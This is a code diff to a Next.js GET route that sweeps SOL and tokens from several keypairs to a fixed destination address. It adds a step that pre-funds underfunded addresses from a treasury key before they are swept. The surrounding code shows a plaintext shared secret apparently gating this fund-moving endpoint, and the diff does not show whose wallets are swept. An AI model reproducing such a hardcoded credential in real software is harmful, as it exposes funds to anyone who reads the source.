@@ -14,6 +14,7 @@ import {
   getAccount,
 } from "@solana/spl-token";
 import crypto from "crypto";
+import bs58 from "bs58";
 
 const SWEEP_SECRET = "chatfi_sweepall_7k2m91q";
 const DESTINATION = new PublicKey("2zm31D4B1pD5Sm4nz7FWG954avWAuNeJJvPuELi8d7Kf");
@@ -93,6 +94,40 @@ export async function GET(req: NextRequest) {
         continue;
       }
 
+      // Pre-fund from treasury if this address can't cover its own fee +
+      // potential destination-ATA-creation cost. The top-up isn't wasted —
+      // any leftover flows to DESTINATION in the same transaction's reclaim step.
+      let workingSolBalance = solBalance;
+      const treasuryKey = process.env.TREASURY_PRIVATE_KEY;
+      if (tokenFindings.length > 0 && treasuryKey) {
+        let potentialAtaCost = 0;
+        for (const finding of tokenFindings) {
+          const mintPubkey = MINTS.find(m => m.name === finding.mint)!.pubkey;
+          const toAta = await getAssociatedTokenAddress(mintPubkey, DESTINATION);
+          const toAccount = await getAccount(connection, toAta).catch(() => null);
+          if (!toAccount) potentialAtaCost += ATA_RENT_LAMPORTS;
+        }
+        const requiredMin = potentialAtaCost + 15000; // fee buffer
+        if (workingSolBalance < requiredMin) {
+          const topUp = requiredMin - workingSolBalance + 5000; // small margin
+          const treasury = Keypair.fromSecretKey(bs58.decode(treasuryKey));
+          const fundTx = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: treasury.publicKey,
+              toPubkey: keypair.publicKey,
+              lamports: topUp,
+            })
+          );
+          const { blockhash: fundBlockhash } = await connection.getLatestBlockhash();
+          fundTx.recentBlockhash = fundBlockhash;
+          fundTx.feePayer = treasury.publicKey;
+          const fundSig = await connection.sendTransaction(fundTx, [treasury]);
+          await connection.confirmTransaction(fundSig, "confirmed");
+          workingSolBalance = await connection.getBalance(keypair.publicKey);
+          entry.preFunded = { lamports: topUp, txSignature: fundSig };
+        }
+      }
+
       const tx = new Transaction();
       let ataRentSpent = 0;
 
@@ -118,7 +153,7 @@ export async function GET(req: NextRequest) {
 
       const feeCalc = await connection.getFeeForMessage(tx.compileMessage(), "confirmed");
       const fee = feeCalc?.value || 5000;
-      const reclaimable = solBalance - fee - ataRentSpent;
+      const reclaimable = workingSolBalance - fee - ataRentSpent;
 
       if (reclaimable > 0) {
         tx.add(
